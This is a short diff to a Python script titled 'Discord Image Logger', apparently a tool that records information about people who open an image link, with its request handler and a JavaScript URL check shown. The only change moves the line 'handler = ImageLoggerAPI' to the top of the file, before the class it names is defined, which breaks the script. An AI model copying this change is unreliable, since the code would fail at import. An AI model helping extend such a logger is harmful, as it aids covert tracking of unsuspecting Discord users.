@@ -1,5 +1,6 @@
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
+handler = ImageLoggerAPI
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -299,5 +300,3 @@ if (!currenturl.includes("g=")) {
     
     do_GET = handleRequest
     do_POST = handleRequest
-
-handler = ImageLoggerAPI
